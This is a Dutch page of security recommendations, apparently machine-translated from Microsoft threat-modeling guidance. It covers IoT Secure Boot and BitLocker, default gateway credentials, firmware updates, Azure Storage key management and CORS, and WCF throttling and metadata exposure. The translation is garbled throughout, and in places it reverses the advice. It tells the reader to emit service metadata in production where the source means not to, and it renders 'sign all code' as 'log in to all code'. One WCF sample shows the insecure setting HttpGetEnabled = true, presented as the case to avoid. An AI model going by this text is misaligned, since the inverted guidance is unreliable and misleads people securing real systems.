| **Verwijzingen**              | [Beveiligd opstarten en BitLocker Apparaatversleuteling op Windows 10 IoT Core inschakelen](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Stappen** | Beveiligd opstarten van UEFI Hiermee beperkt u het systeem zodat alleen de uitvoering van de binaire bestanden die zijn ondertekend door een opgegeven instantie. Deze functie voorkomt u dat onbekende code wordt uitgevoerd op het platform en mogelijk de beveiligingsstatus van deze verzwakken. Schakel UEFI beveiligd opstarten en de lijst met certificeringsinstanties die vertrouwd worden voor ondertekening van programmacode beperken. Meld u aan alle code die is geïmplementeerd op het apparaat met een van de vertrouwde instanties. |

## <a id="partition-iot"></a>Besturingssysteem en de extra partities van IoT-apparaat met BitLocker coderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, sterk afhankelijk van de aanwezigheid van een TPM op het platform is, inclusief het benodigde preOS-protocol in UEFI die voert de benodigde metingen. Deze metingen preOS Zorg ervoor dat het besturingssysteem later een definitieve record van de manier waarop het besturingssysteem is gestart. Versleutelen OS partities waarvoor de BitLocker en eventuele extra partities die ook als ze geen gevoelige gegevens opslaan. |

## <a id="min-enable"></a>Zorg ervoor dat alleen de minimale services en-functies zijn ingeschakeld op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Geen inschakelen of uitschakelen van alle functies of services in het besturingssysteem die is niet vereist voor de werking van de oplossing. Voor bijvoorbeeld als het apparaat niet voor een gebruikersinterface vereist is te worden geïmplementeerd, installeert u Windows IoT Core in headless-modus. |

## <a id="field-bit-locker"></a>Besturingssysteem en de extra partities van IoT-Veldgateway met BitLocker coderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld IoT Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Windows 10 IoT Core implementeert een lichtgewicht versie van BitLocker Apparaatversleuteling, sterk afhankelijk van de aanwezigheid van een TPM op het platform is, inclusief het benodigde preOS-protocol in UEFI die voert de benodigde metingen. Deze metingen preOS Zorg ervoor dat het besturingssysteem later een definitieve record van de manier waarop het besturingssysteem is gestart. Versleutelen OS partities waarvoor de BitLocker en eventuele extra partities die ook als ze geen gevoelige gegevens opslaan. |

## <a id="default-change"></a>Zorg dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Veld IoT Gateway | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Zorg dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie |

## <a id="cloud-firmware"></a>Zorg ervoor dat de Gateway Cloud een proces implementeert voor de firmware verbonden apparaten up-to-date te houden

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT Cloud Gateway | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | Keuze van de gateway - Azure IoT Hub |
| **Verwijzingen**              | [Overzicht van IoT Hub apparaat Management](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [apparaatfirmware bijwerken](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
| **Stappen** | LWM2M is een protocol van de Open Mobile Alliance voor het beheer van IoT-apparaten. Azure IoT-Apparaatbeheer kan communiceren met de fysieke apparaten met behulp van apparaattaken. Zorg ervoor dat de Gateway Cloud een proces implementeert voor het apparaat en andere configuratiegegevens up-to-date houden met behulp van Azure IoT Hub Apparaatbeheer regelmatig te houden. |

## <a id="controls-policies"></a>Zorg ervoor dat apparaten beveiligingsmechanismen eindpunt geconfigureerd volgens het organisatiebeleid

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Een grens machine vertrouwensrelatie | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Zorg dat apparaten eindpunt beveiligingsmaatregelen zoals BitLocker voor schijfniveau versleuteling, antivirus met bijgewerkte handtekeningen hebben, gebaseerde firewall, upgrades voor het besturingssysteem host, beleid, enzovoort worden geconfigureerd volgens het beveiligingsbeleid voor organisatie-groep. |

## <a id="secure-keys"></a>Zorg ervoor dat veilig beheer van Azure opslagtoegangssleutels

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Azure Storage-beveiligingshandleiding - het beheren van uw sleutels van Opslagaccount](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Stappen** | <p>Sleutelopslag: Het is raadzaam toegangssleutels voor opslag in Azure opgeslagen in Azure Key Vault als een geheim en de toepassingen ophalen van de sleutel van de sleutelkluis hebben. Dit wordt aanbevolen vanwege de volgende redenen:</p><ul><li>De toepassing heeft nooit de belangrijkste hardcoded opslag in een configuratiebestand, waardoor deze doorverwezen iemand toegang tot de sleutels zonder specifieke machtiging ophalen</li><li>Toegang tot de sleutels kan worden beheerd met Azure Active Directory. Dit betekent dat de eigenaar van een account kunt toegang verlenen tot de handvol toepassingen die moeten de sleutels ophalen uit Azure Sleutelkluis. Andere toepassingen kan niet worden toegang heeft tot de sleutels zonder deze machtiging verlenen specifiek</li><li>Toegangssleutel wordt opnieuw gegenereerd: Het is raadzaam beschikken over een proces uit veiligheidsoverwegingen Azure opslagtoegangssleutels opnieuw genereren. Meer informatie over waarom en het plannen van sessiesleutels worden beschreven in de Azure Storage-beveiligingshandleiding-verwijzingsartikel</li></ul>|

## <a id="cors-storage"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [CORS-ondersteuning voor de Azure Storage-Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Stappen** | Azure-opslag kunt u inschakelen van CORS – Cross-Origin-resources delen. U kunt domeinen die toegang heeft tot de resources in dit opslagaccount opgeven voor elke storage-account. CORS is standaard uitgeschakeld op alle services. U kunt CORS inschakelen met behulp van de REST-API of de storage-clientbibliotheek aan te roepen op een van de methoden om de beleidsregels van de service. |

## <a id="throttling"></a>Functie beperking van WCF-service inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET Framework 3 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Stappen** | <p>Niet in het gebruik van systeembronnen brengen een limiet kan leiden tot uitputting van bronnen en uiteindelijk denial of service.</p><ul><li>**UITLEG:** Windows Communication Foundation (WCF) biedt de mogelijkheid voor het beperken van serviceaanvragen. Te veel clientaanvragen toestaan kunt overspoelen van een systeem en de bronnen. Anderzijds, zodat slechts een klein aantal aanvragen voor een service kunt voorkomen dat legitieme gebruikers via de service. Elke service moet afzonderlijk worden afgestemd op en geconfigureerd, zodat de juiste hoeveelheid resources.</li><li>**AANBEVELINGEN** van inschakelen WCF-service functie en limieten instellen die geschikt zijn voor uw toepassing.</li></ul>|

### <a name="example"></a>Voorbeeld
Hier volgt een voorbeeldconfiguratie met beperking ingeschakeld:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-openbaarmaking via metagegevens

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | .NET Framework 3 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Voeg Koninkrijk](https://vulncat.fortify.com/en/vulncat/index.html) |
| **Stappen** | Metagegevens kunt aanvallers meer informatie over het systeem en plannen van een formulier van een aanval. WCF-services kunnen worden geconfigureerd om metagegevens weer te geven. Metagegevens gedetailleerde beschrijving informatie geeft en niet moet worden uitgezonden in productieomgevingen. De `HttpGetEnabled`  /  `HttpsGetEnabled` eigenschappen van de klasse ServiceMetaData bepaalt of de metagegevens zal worden blootgesteld aan een service | 

### <a name="example"></a>Voorbeeld
Hiermee geeft u hieronder de code WCF voor het uitzenden van een service-metagegevens
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Uitzenden metagegevens in een productieomgeving. Stel de HttpGetEnabled / eigtenschap eigenschappen van de ServiceMetaData klasse op false. 

### <a name="example"></a>Voorbeeld
WCF metagegevens van de service niet wordt uitgezonden Hiermee geeft u hieronder de code. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
